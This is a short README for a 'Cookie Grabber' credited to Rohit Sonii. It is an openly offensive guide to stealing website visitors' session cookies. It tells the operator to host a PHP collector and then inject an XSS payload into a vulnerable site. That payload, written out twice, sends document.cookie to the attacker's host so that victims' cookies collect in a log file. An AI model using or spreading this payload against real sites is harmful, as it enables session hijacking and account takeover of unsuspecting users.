# Cookie Grabber By Rohit Sonii ~ rohit_sonii 
	**************************** Cookie Grabber By Rohit Sonii ~ rohit_sonii ****************************
	Instructions to Execute:
	1. Choose a free/paid hosting and upload both the files (grabCook.php & grabify.html)
	-----------------------------------------------------
	grabCook.php 		www.ExampleSite.com/grabCook.php
	grabify.html 		www.ExampleSite.com/grabify.html
	-----------------------------------------------------
	
	2. Upload grabify.html to victim's website (RARELY POSSIBLE)
		Alternatively
	   Copy the script command from above and paste in XSS Vulnerable point.
	-----------------------------------------------------
	<script>document.location="http://127.0.0.1/grabCook.php?send_data="+document.cookie</script>
	-----------------------------------------------------
	
	3. Update the path of uploaded `grabCook.php` file.
	-----------------------------------------------------
	<script>document.location="http://www.ExampleSite.com/grabCook.php?send_data="+document.cookie</script>
	-----------------------------------------------------
	
	4. Execute it.
	5. A log.txt will be created in your hosting server with the victim's cookies. 
	
	ENJOY!
